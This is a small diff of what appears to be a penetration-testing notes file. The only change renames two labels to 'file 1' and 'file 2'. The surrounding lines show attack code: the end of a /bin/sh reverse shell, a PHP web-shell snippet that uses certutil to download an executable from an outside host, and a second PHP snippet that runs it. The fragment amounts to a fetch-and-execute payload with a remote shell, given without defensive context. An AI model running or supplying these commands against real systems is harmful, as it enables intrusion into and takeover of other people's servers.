@@ -20,14 +20,14 @@ exec("/bin/sh -i <&3 >&3 2>&3");
 ```
 
 
-1
+file 1
 ```php
 <?php 
 $exec = system('certutil.exe -split -urlcache -f "http://192.168.49.121/shelly.exe" shelly.exe', $val); 
 ?> 
 ```
 
-2
+file 2
 ```php
 <?php
 $exec = system('shelly.exe', $val);
